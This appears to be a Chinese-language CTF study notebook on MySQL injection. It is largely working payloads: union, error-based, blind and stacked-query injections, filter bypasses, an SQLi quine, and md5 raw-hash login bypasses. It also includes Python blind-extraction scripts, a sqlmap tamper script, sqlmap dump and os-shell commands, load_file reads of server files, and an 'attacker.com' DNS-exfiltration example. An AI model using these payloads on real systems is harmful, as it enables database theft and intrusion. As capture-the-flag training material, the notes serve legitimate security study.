__select 和union的列数要相同才会返回结果__

![](./imgs/web_sql2.png)
### 双写
### 堆叠注入
### 0x2 SQL 字符串型注入: 1' and 1=1

测试注入，有没回显或错误
    
    1' and 1=1#

order by x找出该数据表的字段数量
    
    1' order by 1#，1' order by 2#，返回结果相同，输入1' order by 3#返回结果不同，证明字段数为2。

爆数据库名
    
    payload: -1' union select database(),2#
    select * from news where id='-1' union select database(),2#

1.查表名

    -1' union select group_concat(table_name),2 from information_schema.tables where table_schema='sqli'#
    select * from news where id='-1' union select group_concat(table_name),3 from information_schema.tables where table_schema='sqli'#
    返回news,flag

2.查字段名
    
    -1' union select group_concat(column_name),2 from information_schema.columns where table_name='flag'#
    select * from news where id='-1' union select group_concat(column_name),2 from information_schema.columns where table_name='flag'#'
    返回字段flag

3.查数据

    -1' union select flag,1 from sqli.flag#
    select * from news where id='-1' union select flag,1 from sqli.flag#'
    返回目标值

### 0x3 SQL 报错注入: admin'or(updatexml(1,concat(0x7e,version(),0x7e),1))%23&password=21
![报错原理解析](articles/sql错误注入.md)

1. 使用updatexml报错法注入:  admin'or(updatexml(1,concat(0x7e,version(),0x7e),1))%23&password=21
2. 

https://www.cnblogs.com/anweilx/p/12464859.html
https://www.cnblogs.com/Cl0ud/p/12419200.html
https://blog.csdn.net/qq_45653588/article/details/106342571
https://blog.csdn.net/weixin_44732566/article/details/104417351

方法1 updatexml -- 极客大挑战 2019]HardSQL

```
查version
username=admin'or(updatexml(1,concat(0x7e,version(),0x7e),1))%23&password=21
查database
username=admin'or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&password=21
查表
username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&password=21
查字段
username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))%23&password=21
查数据
username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(username,'~',password))from(H4rDsq1)),0x7e),1))%23&password=21
看wp说用right()语句在查询后面部分 只查到了一半再用left()right()语句查询拼接
username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(right(password,25)))from(H4rDsq1)),0x7e),1))%23&password=21

---
用extractvalue一样, 少一个,1的参数
?username=admin'or(extractvalue(1,concat(0x7e,user(),0x7e)))%23&password=21
?username=admin'or(extractvalue(1,concat(0x7e,database(),0x7e)))%23&password=21
?username=admin'or(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e)))%23&password=pass
?username=admin'or(extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e)))%23&password=pass
?username=admin'or(extractvalue(1,concat(0x7e,(select(group_concat(right(password,30)))from(H4rDsq1)),0x7e)))%23&password=pass

```

方法2

测试

    1#
    select * from news where id=1#
    查询正确 => 判断出为整形的报错注入

查询数据库名

    1 Union select count(*),concat(database(),0x26,floor(rand(0)*2))x from information_schema.columns group by x;
                                                                   // from information_schema.columns 可以是别的，但一定要有数据
    select 1 Union select count(*),2 group by concat(database(),floor(rand(0)*2)); //简化版
    看有几列填几个数
    1 Union select count(*),concat(database(),0x26,floor(rand(0)*2))x from information_schema.columns group by x;
    select 1 Union select count(*),concat(database(),0x26,floor(rand(0)*2))x from information_schema.columns group by x;
    select 1 Union select count(*),concat((查询语句),0x26,floor(rand(0)*2))x from information_schema.columns group by x;
    select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;

查表名

    select 1 Union select count(*),concat((select table_name from information_schema.tables where table_schema='sqli' limit 0,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x
    select 1 Union select count(*),concat((select table_name from information_schema.tables where table_schema='sqli' limit 1,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x
    多个表需要挨个试验

查字段名

    1 Union select count(*),concat((select column_name from information_schema.columns where table_name='flag' limit 0,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x
    返回flag

查数据
    
    1 Union select count(*),concat((select flag from flag limit 0,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x

### 0x4 SQL union生成虚拟表 md5 绕过: name=1' union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'#&pw=123456
`[GXYCTF2019]BabySQli`
https://www.jianshu.com/p/034cfa61a305
https://www.cnblogs.com/gaonuoqi/p/12355035.html

### 0x5 盲注
`[极客大挑战 2019]FinalSQL`

```
id=0^(1) 可返回数据时
```
https://www.cnblogs.com/hello-there/p/13026698.html
http://www.pdsdt.lovepdsdt.com/index.php/2019/11/19/2019_geek_web/


1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))=%d)^1"%(i,ord(j)) 获取数据库名称

1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='geek'),%d,1))=%d)^1"%(i,ord(j)) 获取数据库表名

```
1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))>%d)" %(i,mid)# i d是参数
或
1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))=%d)^1"%(i,ord(j))
```

语句分析

```
SET NAMES utf8mb4;
DROP TABLE IF EXISTS `user`;
CREATE TABLE `user`  (
  `id` int(11) NULL DEFAULT NULL,
  `password` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NULL DEFAULT NULL
) ENGINE = InnoDB CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Dynamic;
INSERT INTO `user` VALUES (NULL, 'pwd1');
INSERT INTO `user` VALUES (NULL, 'pwd2');

select group_concat(password) from user  -- pwd1,pwd2
select substr((select group_concat(password) from user),1,1)  -- p
select ascii(substr((select group_concat(password) from user),1,1)) -- 112
select (ascii(substr((select group_concat(password) from user),1,1)) > 1) -- 1
select 1^(ascii(substr((select group_concat(password) from user),1,1)) > 1) -- 0
```


1.fuzz字典
```
and
aNd
or
oR
oorr
select
sElect
union
unIon
union select
union/**/select
/**/
 
 '
 "
 \
 information_schema
 ^
 &&
 uniOn/**/select
```


`''`没有被过滤，输入11回显`'ERROR',1^0回显'NO! Not this! Click others~~~'`，判断出为数字型注入。

由于空格被过滤，用()代替，我这里payload直接写到了最后一步，猜解表名，字段名的payload我这里就不写了，直接去嵌套常规的联合查询语句即可。

```
payload = "http://33e8c85b-d0d4-4777-9143-702ddf10ee0e.node3.buuoj.cn/search.php?id=1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))>%d)" %(i,mid)
```


### 0x4 布尔注入
https://blog.csdn.net/weixin_44732566/article/details/104455318

可以看到id=1 and 1=1 => success 和id=1 and 1=2 =>error，所以我们使用if(expr1,expr2,expr3)函数来盲注
    
    if(expr1,expr2,expr3)，如果expr1的值为true，则执行expr2语句，如果expr1的值为false，则执行expr3语句。

判断语句，当第一条语句是正确就执行第二条语句，不正确就执行第三条语句, 子查询要求返回结果只有一条记录,否则报错
    
    子查询格式：select * from users where id=(select username from users);

判断数据库名第一位为's':
    
    payload: select * from news where id=if(substr(database(),1,1)='s',1,(select table_name from information_schema.tables))
    循环脚本爆破
    payload: select * from news where id=if(substr(database(),%d,1)='%s',1,(select table_name from information_schema.tables))

查table
    # 查全部表
    select * from user where id=1  and ord( SUBSTR((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>97;
    # 查表个数
    select * from user where id=1 and (select count(*) from information_schema.tables where table_schema=database())= 表的个数 %23
    # 查表
    select * from user where id=1  and ord(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>97
    select * from user where id=1  and ord(substr((select table_name from information_schema.tables where table_schema=database() limit 第几个表,1),1,1))=字符ascii值


    url = urlOPEN+'if(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)="%s",1,(select table_name from information_schema.tables))' %(k,j,i)
    解析
        select table_name from information_schema.tables where table_schema=database() -- 查当前数据库所有表
        select table_name from information_schema.tables where table_schema=database() limit %d,1 -- 所有表中的%d行

column

    select * from user where id=1 and ord( SUBSTR((select group_concat(column_name) from information_schema.columns where table_name="{}"),{},1))>{}'
    url=urlOPEN+'if(substr((select column_name from information_schema.columns where table_name="flag"and table_schema= database() limit %d,1),%d,1)="%s",1,(select table_name from information_schema.tables))' %(k,j,i)

data
    
    url=urlOPEN+'if(ascii(substr((select flag from flag),%d,1))=%d,1,(select table_name from information_schema.tables))' %(j,i)

### 0x10读取文件

load_file配合mid

    配合个不存在的id
    query=100/**/union/**/select/**/load_file('/var/www/html/secret.php')
    query=0/**/union/**/select/**/load_file('/var/www/html/secret.php')
    query=-1/**/union/**/select/**/load_file('/var/www/html/secret.php')
    
    select load_file('E:\flag.txt')
    select ascii(mid((select load_file('E:\flag.txt')),1,1));
    select ascii(mid((select load_file('E:\flag.txt')),2,1)); -- 1,2,3逐位读取再转换成字符


直接注入表读取

    create table abc(cmd text);
    insert into abc(cmd) values (load_file('E:\flag.txt'));
    select * from abc;


### 宽字节注入

* 運
* Unicode编号： U+904B
* GBK编码： df5c

* select * from users where id = '<span style="color: #f4c01b">%DF\\'#</span>'

### 二次注入


* INSERT INTO users VALUES('<span style="color: #f4c01b">admin\\'#</span>','password');
* UPDATE users SET password='123' WHERE username='<span style="color: #f4c01b">admin'#</span>'

### 无列名注入
|   id   |username| xxxxxx           |
| ------ | ------ | ------           |
|   1    | admin  |flag{this_is_flag}|
|   2    | admin2 |   1              |

select * from users where id=1 union select flag,2,3 from flag

select c from (select 'a','b','c' union select * from users) as t

|   c    |
| ------ |
|   c    |
| 123456 |
|  abc   |
### 其他 sql 使用方法
#### extractvalue

```
用户名
1' and (extractvalue(1,concat(0x7e,user(),0x7e)));#
error 1105 : XPATH syntax error: '~root@localhost~'

数据库

1' and (extractvalue(1,concat(0x7e,database(),0x7e)));#
error 1105 : XPATH syntax error: '~supersqli~'

版本
1' and (extractvalue(1,concat(0x7e,version(),0x7e)));#
```
### SQLi-Quine -- 通过replace bypass 第五空间 yet_another_mysql_injection

https://wp.n03tack.top/posts/56002/
https://www.shysecurity.com/post/20140705-SQLi-Quine
```
'union/**/select/**/REPLACE(REPLACE('"union/**/select/**/REPLACE(REPLACE("^",CHAR(34),CHAR(39)),CHAR(94),"^")AS/**/atao#',CHAR(34),CHAR(39)),CHAR(94),'"union/**/select/**/REPLACE(REPLACE("^",CHAR(34),CHAR(39)),CHAR(94),"^")AS/**/atao#')AS/**/atao#
```

```
"union/**/select/**/REPLACE(REPLACE("^",CHAR(34),CHAR(39)),CHAR(94),"^")AS/**/atao#

第一次REPLACE
'union/**/select/**/REPLACE(REPLACE('^',CHAR(34),CHAR(39)),CHAR(94),'^')AS/**/atao#

第二次REPLACE
'union/**/select/**/REPLACE(REPLACE('"union/**/select/**/REPLACE(REPLACE("^",CHAR(34),CHAR(39)),CHAR(94),"^")AS/**/atao#',CHAR(34),CHAR(39)),CHAR(94),'"union/**/select/**/REPLACE(REPLACE("^",CHAR(34),CHAR(39)),CHAR(94),"^")AS/**/atao#')AS/**/atao#
```


脚本 
```python
def quine(data, debug=True):
    data = data.replace('%%',"REPLACE(REPLACE(%%,CHAR(34),CHAR(39)),CHAR(37),%%)")
    blob = data.replace('%%','"%"').replace("'",'"')
    data = data.replace('%%',"'"+blob+"'")
    data = data.replace(' ','/**/')
    if debug: print(data)
 
quine("'UNION SELECT %% AS a#")
 
'''
'UNION/**/SELECT/**/REPLACE(REPLACE('"UNION/**/SELECT/**/REPLACE(REPLACE("%",CHAR(34),CHAR(39)),CHAR(37),"%")/**/AS/**/a#',CHAR(34),CHAR(39)),CHAR(37),'"UNION/**/SELECT/**/REPLACE(REPLACE("%",CHAR(34),CHAR(39)),CHAR(37),"%")/**/AS/**/a#')/**/AS/**/a#
'''
```


## Sql注入例题/示例/实战
### 网鼎杯 2018 Fakebook

```
/view.php?no=1 and 1=1
/view.php?no=1 and 1=2
/view.php?no=1 order by 5
//发现过滤了union select 使用注释绕过
/view.php?no=-1 union/**/select 1,2,3,4
/view.php?no=-1 union/**/select 1,database(),3,4
//得到数据库数据fakebook 
/view.php?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()
//得到表名数据:users 
/view.php?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'
//得到字段数据:no,username,passwd,data
/view.php?no=-1 union/**/select 1,group_concat(data),3,4 from users
//得到data字段下数据:O:8:"UserInfo":3:{s:4:"name";s:7:"xiaohua";s:3:"age";i:12;s:4:"blog";s:9:"baidu.com";} 
```
### 单引号过滤 | [CISCN2019 总决赛 Day2 Web1]Easyweb 

```php
<?php
include "config.php";

$id=isset($_GET["id"])?$_GET["id"]:"1";
$path=isset($_GET["path"])?$_GET["path"]:"";

$id=addslashes($id);
$path=addslashes($path);

$id=str_replace(array("\\0","%00","\\'","'"),"",$id);
$path=str_replace(array("\\0","%00","\\'","'"),"",$path);

$result=mysqli_query($con,"select * from images where id='{$id}' or path='{$path}'");
$row=mysqli_fetch_array($result,MYSQLI_ASSOC);

$path="./" . $row["path"];
header("Content-Type: image/jpeg");
readfile($path);
?>
```
payload: 

```
url = "?id=\\0&path=or 1=if(ascii(substr(database(),%d,1))>%d,1,-1)%%23" % (i, mid)
```

### 单引号过滤| 二次注入 | 网鼎杯2018 comment

```php
<?php
include "mysql.php";
session_start();
if($_SESSION['login'] != 'yes'){
    header("Location: ./login.php");
    die();
}
if(isset($_GET['do'])){
switch ($_GET['do'])
{
case 'write':
    $category = addslashes($_POST['category']);
    $title = addslashes($_POST['title']);
    $content = addslashes($_POST['content']);
    $sql = "insert into board
            set category = '$category',
                title = '$title',
                content = '$content'";
    $result = mysql_query($sql);
    header("Location: ./index.php");
    break;
case 'comment':
    $bo_id = addslashes($_POST['bo_id']);
    $sql = "select category from board where id='$bo_id'";
    $result = mysql_query($sql);
    $num = mysql_num_rows($result);
    if($num>0){
    $category = mysql_fetch_array($result)['category']; //从结果取出的数据没有过滤直接拼接到sql语句
    $content = addslashes($_POST['content']);
    $sql = "insert into comment
            set category = '$category',
                content = '$content',
                bo_id = '$bo_id'";
    $result = mysql_query($sql);
    }
    header("Location: ./comment.php?id=$bo_id");
    break;
default:
    header("Location: ./index.php");
}
}
else{
    header("Location: ./index.php");
}
?>

```

二次注入

```php
$category = addslashes($_POST['category']);
$title = addslashes($_POST['title']);
$content = addslashes($_POST['content']);
```

```
$category = mysql_fetch_array($result)['category']; //从结果取出的数据没有过滤直接拼接到sql语句
```
payload:

<div> insert  into comment set category ='<span style="color:red">', content=user(),/*</span>'content='<span style="color:red">*/#</span>',bo_id=''</div>
## 工具
### sqlmap
https://blog.csdn.net/Litbai_zhang/article/details/87939785

自写脚本
https://www.cnblogs.com/afanti/p/9949660.html
https://xz.aliyun.com/t/3245#toc-4

#### FAQ

测试有无post注入

`sqlmap -u http://vip.fj0730.cn/login.asp --forms`

#### sqlmap manual

[SQLMap命令详解及使用操作](https://blog.csdn.net/yinghua1234/article/details/105999231?utm_source=app)

[tamper](https://securityonline.info/sqlmap-tamper-script-bypassing-waf/)

将请求保存成3.txt

sqlmap  -r 3.txt --technique T --level 3 --tamper=space2comment

sqlmap  -r 3.txt --technique T --level 3 --tamper=space2comment -D injection -T admin --dump

sqlmap -u "http://xx"

sqlmap -u "http://可能注入的某个提交参数的url" --cookie="这次提交的cookie"

    浏览器url栏输入 javascript:document.cookie或者在console栏中输入document.cookie即可获得cookie

查看 database

    sqlmap -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tamper "space2comment.py" --current-db --batch
    # web1

查看表

    sqlmap -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tamper "space2comment.py" -D web1 --tables

查看列

    sqlmap -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tamper "space2comment.py" -D web1 -T flag --columns
    # 遇到提示选y

查看flag信息

    sqlmap -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tamper "space2comment.py" -D web1 -T flag -C flag --dump


--technique

指定sqlmap使用的检测技术，默认情况下会测试所有的方式。

Boolean-based blind

Error-based

Union query-based

Stacked queries(对文件系统、操作系统、注册表操作时，必须指定该方式)

Time-based blind

--time-sec

设置延迟时间，基于时间的注入检测默认延迟时间是5秒

--union-cols

联合查询时默认是1-10列，当level=5时会增加到测试50个字段数，可以使用此参数设置查询的字段数。

--union-char

默认情况下sqlmap针对UNION查询的注入会使用NULL字符；

有些情况下使用NULL字符会造成页面返回失败，而使用一个随机整数是成功的，可以使用--union-char指定UNION查询的字符。

--dns-domain

攻击者控制了某DNS服务器，使用此功能可以提高数据查询的速度

例如：--dns-domain="attacker.com"

--second-order

有些时候注入点输入的数据，返回的结果并不是当前页面，而是另外一个页面。

使用此参数指定到哪个页面获取响应判断真假，--second-order后面跟一个判断页面的URL地址。例如：

--second-order="http://1.1.1.1/a.php"


[SQLMap中tamper的简介](https://blog.csdn.net/Litbai_zhang/article/details/99681398)
#### sqlmap 常用方法

常用方法

    1.查数据库
        python sqlmap.py -u http://challenge-b6a3a184decf6636.sandbox.ctfhub.com:10080/?id=1 --batch --dbs
        python sqlmap.py -u http://challenge-b6a3a184decf6636.sandbox.ctfhub.com:10080/?id=1 --batch --current-db
    2.查表名
        python sqlmap.py -u http://challenge-b6a3a184decf6636.sandbox.ctfhub.com:10080/?id=1 --batch -D sqli --tables
    查字段
        python2 sqlmap.py -u http://challenge-b6a3a184decf6636.sandbox.ctfhub.com:10080/?id=1 --batch -D sqli -T flag --columns
    4.查数据
        python sqlmap.py -u http://challenge-d20f8ccada64b868.sandbox.ctfhub.com:10080/?id=1 --batch -D sqli -T flag -C flag --dump

sqlmap -u "http://xxx" --batch
    
    之后写入同样的命令加参数
    -u URL
    --batch 自动测试，不提示
    --current-user
    --current-db
    --dump
    --os-shell
    --dbs   # 列出所有数据库
    -D tourdata --tables # 所有表
    -D tourdata -T userb --columns # 表字段
    sqlmap.py -r Filename.txt --dbs --level=3
    sqlmap -u http://x.x/show.php?id=35 --level=3 -D test --tables -C thekey --dump


使用http请求文件

    可以用burpsuite抓包并复制到txt文件（注意请用gedit编辑器，vim会因为格式问题报错）
    sqlmap -r 1.txt
    2.使用burpsuite log文件 （勾选上options中的Misc中的proxy）
    sqlmap -l log.txt

#### sqlmap 脚本

a.txt:
```python
POST /admin/list.php HTTP/1.1
Host: kzone.2018.hctf.io
Content-Length: 33
Cache-Control: max-age=0
Origin: http://kzone.2018.hctf.io
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Referer: http://kzone.2018.hctf.io/admin/login.php
Accept-Encoding: gzip, deflate
X-Forwarded-For: 127.0.1.3,1,2,3,4
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Cookie: PHPSESSID=7notm2n004aen7oln00ohd9ei3; islogin=1; login_data=*
Connection: close

user=rr123&pass=rr123&login=Login
```
Command:

`python sqlmap.py -r a.txt --tamper=hctf --dbs --dbms=mysql --thread=10 -D hctf_kouzone -T F1444g -C F1a9 --dump -v3`

tamper/hctf.py

```python
#!/usr/bin/env python
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    data = '''{"admin_user":"%s"};'''
    payload = payload.lower()

    payload = payload.replace('u', '\u0075')
    payload = payload.replace('o', '\u006f')
    payload = payload.replace('i', '\u0069')
    payload = payload.replace('\'', '\u0027')
    payload = payload.replace('\"', '\u0022')
    payload = payload.replace(' ', '\u0020')
    payload = payload.replace('s', '\u0073')
    payload = payload.replace('#', '\u0023')
    payload = payload.replace('>', '\u003e')
    payload = payload.replace('<', '\u003c')
    payload = payload.replace('-', '\u002d')
    payload = payload.replace('=', '\u003d')
    payload = payload.replace('f1a9', 'F1a9')
    payload = payload.replace('f1', 'F1')
    return data % payload
```

### 实战常用

```
检测有无dba权限可写入
sqlmap -u "<url>" --is-dba
```

### sql 堆叠注入

堆叠注入 [BUUCTF [SUCTF 2019]EasySQL](https://blog.csdn.net/qq_42158602/article/details/103930598), [WP2](https://www.cnblogs.com/chrysanthemum/p/11729891.html) `select $_GET['query'] || flag from flag`

    1;show databases#
    
    1';show databases;
    1';show tables;
    1';show columns from words;
    0';show columns from `1919810931114514`;#
    0';rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;#
    1' or 1=1#
    flag{5a59e750-5531-4525-b39a-02edff259a48}

例2 [[GYCTF2020]Blacklist](https://www.cnblogs.com/gaonuoqi/p/12398554.html)
最后一步时使用 [Handler](https://dev.mysql.com/doc/refman/8.0/en/handler.html)

`preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);`
```sql
1';
HANDLER FlagHere OPEN;
HANDLER FlagHere READ FIRST;
HANDLER FlagHere CLOSE;#
-- FlagHere是表名
```
例3  __[强网杯 2019]随便注__
最后一步 先构造一个sql语句，然后执行它，payload转化成16进制绕过waf
```sql
1';
SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;
prepare execsql from @a;
execute execsql;#
-- select * from `1919810931114514`
--- 方法2
1';PREPARE jwt from concat(char(115,101,108,101,99,116), ' * from `1919810931114514` ');EXECUTE jwt;#
```



在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，

mysql 缺省不支持。需要调整mysql 的sql_mode模式：pipes_as_concat, 将||视为字符串的连接操作符而非或运算符

    1;set sql_mode=PIPES_AS_CONCAT;select 1
    非预期，没有过滤*直接注入*
    *,1

字符串或时前面的数字时结果为1则返回1，为0则返回0，效果跟直接*一样

![](./imgs/web-sql1.png)


2

    'or 1=1#             //
    1'order by 2#         //只有2字段。
    1'union select 1,2#         //返回一个正则过滤 return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
    想到堆叠注入，试一下，
    1';show tables;#            // 有我们要的字段
    
        array(1) {
          [0]=>
          string(16) "1919810931114514"
        }
    0'; show columns from words ;#



### sql 盲注

__知识点__

页面只返回True（密码错误）或False（用户名错误），考察SQL盲注。

解题步骤 http://web.jarvisoj.com:32787/login.php

    admin                       //尝试admin提示密码错误，其他用户名均提示用户名错误
    'or 1=1#                    //提示用户名错误，过滤了空格或or
    'or/**/1=1#                 //提示密码错误，确定过滤了空格
    'or/**/ascii(substr(database(),1,1))>1#     //提示密码错误，可以开始爆破了
    [BJDCTF 2nd]简单注入
       select * from users where username='admin\' and password='123456#';
       select * from users where username='admin and password=' 恶意代码 #';
       post --- username=admin\ password=^(ascii(substr(password,1,1))>1000)#
    
    使用username=admin’#&password=123456,页面返回密码错误，说明后台没有对#和’进行过滤。
    使用username=admin’ or 1=1#&password=123456，页面返回用户名错误，上面后台对admin’ or 1=1#中的部分内容进行了过滤。过滤的内容有可能是or也有可能是空格。
    使用username=user’//or//1=1#&password=123456，页面返回密码错误，说明输入的SQL语句能够被执行，这也表明后台仅仅是过滤了空格。
    总结，username存在sql注入，同时仅仅只是过滤了空格，那么就是一个盲注了
    
    整个PoC就是一个基于错误的盲注的步骤了，具体的方法可以参考文章。
    
    查找表，username=user’//or//exists(select////from/*/admin)#&password=123456,页面返回密码错误，那么就说明在数据库中存在admin表
    查找字段username=user’//or//exists(select//username,password//from/**/admin)#&password=123456，页面返回密码错误，说明在admin表中存在username和password字段。
    username=user’//or//exists(select//count()//from/*/admin)#&password=123456，页面返回密码错误，说明在admin表中仅仅只存在一条记录，接下来就好办了
    得到password长度，username=user’//or//(select//length(password)//from/**/admin)>10#&password=123456，通过二分试探法，最终发现password的字段长度是32位，说明可能采用的是md5的方式来进行加密的。
    在确定了password的长度之后，接下来就是利用Python来进行爆破了。
    
    username=user'/**/or/**/exists(select/**/username,password/**/from/**/admin)#&password=123456

方法2, 
username=any'/**/union/**/select/**/'c4ca4238a0b923820dcc509a6f75849b'#&password=1

    # c4ca4238a0b923820dcc509a6f75849b 是 1 的md5 (password=1所以用1)
    # username 随意写

#### 无列名盲注
https://zhuanlan.zhihu.com/p/98206699


select `3` from (select 1,2,3 union select * from admin)a;

当然，多数情况下，` 会被过滤。当 ` 不能使用的时候，使用别名来代替：

select b from (select 1,2,3 as b union select * from admin)a;

同时查询多个列：

select concat(`2`,0x2d,`3`) from (select 1,2,3 union select * from admin)a limit 1,3;

简而言之，可以通过任意命名进入该表，然后使用 SELECT 查询这些字段中的任何已知值。

payload：

select user,password from admin where id=-1 union select 1,(select concat(`1`,0x32,`3`) from (select 1,2,3 union select * from admin)a limit 1,1);


注表名

111'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_columns),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'

无列名，只能无名列注入。

111'/**/union/**/select/**/1,(select/**/aaa/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)a/**/limit/**/1,1),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'



### 实例
[[SWPU2019]Web1](https://www.jianshu.com/p/dc9af4ca2d06)

尝试 `-1' select 1,2,3'` 提示 `select1,2,3 limit 0,1 at line 1`

复原语句 `select * from ads where title = '$title' limit 0,1;`

payload替换$title, 再将空格替换为`/**/`:
    
    -1'union select/**/1,(
        select/**/group_concat(b)/**/from(
            select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users
        )as/**/x
    ),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22

解析

    select 1,2 as a,3 as b union select * from users ， users有3列，用a代表2列 b代表3列一会儿进行group by, 就能控制2 3列了
    select group_concat(b) from(select 1,2 as a,3 as b union select * from users)as x, 再group concat b把users的第3列即flag列 连接起来
    再组合上去，由系统查出2，3列得到flag
    
    as x 也需要，Every derived table must have its own alias



### 常用语句

where id = 1 and 1=1

where id = 1 and 1=2

1有结果，2没结果，上面两句确定数据库是否执行。

select * from user where id = 1 and 1=1 union select flag from flag, union需要前后列一样。

使用orderby 看几次没结果确定列数。

    union select 1,2,3          ---是列数
    http://192.168.100.111/web/web15/?id=1 Order by 3  , 确定了是3列。
    http://192.168.100.111/web/web15/?id=1 Order by 4  , 没有结果。
    
    前面没结果时显示后面的结果。用-1 或者 and 1=2
    http://192.168.100.111/web/web15/?id=-1 Union Select 1,2,3
    http://192.168.100.111/web/web15/?id=-1 Union Select database(),2,3     --查询库名
    http://192.168.100.111/web/web15/?id=-1 Union Select database(),user(),3     --查询用户名
    http://192.168.100.111/web/web15/?id=-1 Union Select database(),user(),version()     --查询数据库版本
    http://192.168.100.111/web/web15/?id=-1 Union Select database(),user(),version()     --查询数据库版本
    INFORMATION_SCHEMA 数据库保存 库，表的信息。
      SCHEMATA 库名
      TABLES  有两列，一列所有库，二列所有库的所有表。
      COLUMNS 全部库的表的列
    
    --有问题 http://192.168.100.111/web/web15/?id=-1 Union Select TABLE_NAME,2,3 where table_schema = database()     --查询数据库表名
    --有问题 http://192.168.100.111/web/web15/?id=-1 UNION SELECT TABLE_NAME,2,3 FROM INFORMATION_SCHEMA WHERE TABLE_SCHEMA = DATABASE() 

### sql md5 加密注入
方法1 

ffifdyop 撞

`抓包的 Response Hint: "select * from `admin` where password='".md5($pass,true)."'"`

* 根据此题中的password的语句：`select * form admin where password=''`
进行password的绕过，需将此语句填充为：`select * form admin where password=''or 1`，又因为此题有md5加密，并转换为字符串，所以根据前人，大师傅们的总结，有：

    字符串：`ffifdyop`

    md5加密后：`276f722736c95d99e921722cf9ed621c` => hex2ascii: 'or'6??????

    而 Mysql 刚好又会吧 hex 转成 ascii 解释，因此拼接之后的形式是

        select * from 'admin' where password='' or '6xxxxx'

方法2

Google 了一下 `sql injection php md5`，发现了有趣的东西，下面就放一个串就好。

    password: 129581926211651571912466741651878684928
    
    raw: ?T0D??o#??'or'8.N=?

### 扩展MySQL函数------ UDF

udf是mysql自定义函数包，

udf.so用于linux系统，udf.dll用于windows系统。

有时候我们需要对表中的数据进行一些处理而内置函数不能满足需要的时候，就需要对MySQL进行一些扩展，使用者自行添加的MySQL函数就称为UDF(User Define Function)。

做法就是

    $ mysql
    > select @@plugin_dir;
得到插件的目录，将 udf.so 拷贝过去，然后再

    $ mysql
    > create function getflag returns string soname 'udf.so';
    > select help_me();
    > select getflag();



### 知识点

反引号可可以注入``
### SQL约束攻击
  字符串末尾的空格符将会被删除。换句话说"vampire"等同于"vampire "，构造"admin   "作为admin登录
### Scripts
#### sql_load_file

```python
url = "http://eci-2zeedsjzsv7gv015g3i4.cloudeci1.ichunqiu.com:80/?id='%20union%20selecSELECTt%201%20%2c2%20WHwhereERE%201%3d1%20"
payload = "and ascii(substr(convert(( LOAD_FILE( '/flag')) using utf8) ,%s,1))>%s # "
flag = ''
for i in range(1, 128):
    max = 126
    min = 33 
    while abs(max-min) > 1:
        mid = int((max+min)/2)
        p = payload % (str(i), str(mid))
        p=urllib.parse.quote(p)
        response = requests.get(url + p)
        str_response= str(response.content, encoding = "utf-8")
        if str_response.find("GET me password") != -1:
            min = mid
        else:
            max = mid
    flag = flag+chr(max)
```
## sql writeup


### MySQL查询的按位比较 -- CTFshow web1, [GYCTF2020]Ezsqli

https://yq1ng.github.io/z_post/CTF%E7%A7%80WEB-WP/#CTFshow-web1
https://yq1ng.github.io/z_post/GYCTF2020%E9%83%A8%E5%88%86WEB/#gyctf2020ezsqli
https://www.gem-love.com/ctf/1782.html
https://wp.ctf.show/d/23-ctfshow-web1
https://www.extrader.top/posts/d991f96a/#CTFshow%E2%80%94web1

`select * order by password`

>alag{aaaaa}<flag{a}
